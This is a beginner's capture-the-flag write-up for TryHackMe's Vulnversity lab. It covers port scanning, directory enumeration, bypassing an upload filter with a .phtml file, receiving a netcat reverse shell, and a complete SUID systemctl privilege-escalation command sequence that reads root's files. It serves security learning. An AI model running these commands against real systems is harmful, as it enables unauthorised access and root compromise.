# TryHackMe: Vulnversity

A beginner-friendly penetration-testing walkthrough for the **Vulnversity** room on [TryHackMe](https://tryhackme.com/). This repository documents the reconnaissance, web directory enumeration, file-upload testing, reverse-shell access, and privilege-escalation stages completed in the authorized lab environment.

> **Disclaimer:** This write-up is for educational purposes and documents activity performed against the TryHackMe Vulnversity lab only. Do not use these techniques against systems without explicit permission.

## Table of contents

- [Lab overview](#lab-overview)
- [Repository structure](#repository-structure)
- [Tools used](#tools-used)
- [Methodology](#methodology)
  - [1. Reconnaissance with Nmap](#1-reconnaissance-with-nmap)
  - [2. Web enumeration with Gobuster](#2-web-enumeration-with-gobuster)
  - [3. File-upload testing](#3-file-upload-testing)
  - [4. Reverse-shell connection](#4-reverse-shell-connection)
  - [5. Privilege escalation](#5-privilege-escalation)
- [Exploit-file note](#exploit-file-note)
- [Key takeaways](#key-takeaways)
- [Credits](#credits)

## Lab overview

| Item | Details |
|---|---|
| Platform | TryHackMe |
| Room | Vulnversity |
| Difficulty | Beginner |
| Attacker machine | Kali Linux |
| Target OS identified by scan | Ubuntu/Linux |
| Main objective | Obtain user-level access and escalate privileges to root |

**Important:** TryHackMe target and attacker IP addresses can change between sessions. The addresses in the original notes have therefore been replaced with placeholders. Use the IP addresses assigned to your own active lab session.

## Repository structure

```text
Vulnversity-TryHackMe/
├── README.md
├── scans/
│   └── nmap-scan.txt
├── notes/
│   ├── methodology.txt
│   └── php-extensions.txt
├── screenshots/
│   └── (Add relevant lab screenshots here)
└── .gitignore
```

## Tools used

- **Nmap** – port scanning and service/version detection
- **Gobuster** – web directory enumeration
- **Netcat (nc)** – receiving the reverse-shell connection
- **Browser** – inspecting the web application and consulting GTFOBins
- **Kali Linux** – attacker environment

## Methodology

### 1. Reconnaissance with Nmap

First, I scanned the target to identify open ports and running services.

```bash
nmap -sV <TARGET_IP> -oN scanReport.txt
```

The scan identified these six open TCP ports:

| Port | Service | Detected version/details |
|---|---|---|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 139 | NetBIOS/SMB | Samba |
| 445 | SMB | Samba |
| 3128 | HTTP proxy | Squid 4.10 |
| 3333 | HTTP | Apache 2.4.41 (Ubuntu) |

Port **3333** was serving the web application, so I inspected it in a browser:

```text
http://<TARGET_IP>:3333/
```

The saved scan output is available in [`scans/nmap-scan.txt`](scans/scanReport.txt).

### 2. Web enumeration with Gobuster

The next step was directory enumeration to discover hidden paths on the web server.

```bash
gobuster dir -u http://<TARGET_IP>:3333/ \
-w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

The scan revealed directories including:

- `images`
- `css`
- `js`
- `internal`

The `internal` directory was particularly interesting because it contained a file-upload page.

### 3. File-upload testing

I inspected the upload functionality and tested which file extensions the application accepted.

The `.php` extension was rejected. After testing alternative extensions, `.phtml` was accepted.

The accepted extensions recorded during testing are listed in [`notes/php-extensions.txt`](notes/php-extensions.txt).

For the lab, I prepared a PHP reverse-shell payload using the PentestMonkey PHP reverse-shell template and configured it with the attacker machine's IP address and port. (Reverse Shell Generator)

### 4. Reverse-shell connection

I started a Netcat listener on the attacker machine:

```bash
nc -lvnp 1234
```

After uploading the lab payload, I visited its upload location:

```text
http://<TARGET_IP>:3333/internal/uploads/exploit.phtml
```

The listener received a connection. I then ran basic commands to inspect the shell and confirm the current user and host:

```bash
hostname
whoami
pwd
```

While exploring the filesystem, I found the `bill` home directory under `/home`.

### 5. Privilege escalation

I searched for files with the SUID permission bit:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

`/bin/systemctl` stood out during the investigation.

I consulted **GTFOBins** and looked up the SUID technique for `systemctl`. Following the lab's privilege-escalation method, I used a temporary systemd service to read the root flag into a temporary output file.

The commands used in the lab were:

```bash
TF=$(mktemp).service

echo '[Service]
Type=Oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > "$TF"

/bin/systemctl link "$TF"
/bin/systemctl enable --now "$TF"
```

I then checked the output:

```bash
cat /tmp/output
```

This completed the root-flag retrieval step in the TryHackMe lab.

## Exploit-file note

The reverse-shell payload was created and used inside the authorized TryHackMe environment. The file was named `exploit.phtml` and was stored on my Kali attacker machine.

I could not transfer this file to my Windows 10 host because Windows Defender repeatedly detected and removed it. Therefore, **the payload file is intentionally not included in this GitHub repository**.

The repository documents the payload's role and the steps taken without distributing the reverse-shell file.

## Key takeaways

Through this room, I practised:

- Identifying open ports and services with Nmap.
- Enumerating web directories with Gobuster.
- Investigating a web application's file-upload functionality.
- Understanding how file-extension validation can affect upload security.
- Receiving a reverse-shell connection with Netcat.
- Enumerating a Linux system after gaining initial access.
- Identifying SUID binaries and researching privilege-escalation techniques with GTFOBins.
- Documenting a penetration-testing workflow.

## Credits

- Lab: [TryHackMe – Vulnversity](https://tryhackme.com/room/vulnversity)
- Privilege-escalation reference: [GTFOBins](https://gtfobins.github.io/)
- Reverse-shell reference: [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- Additional guidance: Carpa Security (YouTube), consulted during the final part of the room.

---

*Documented as a personal cybersecurity learning exercise.*
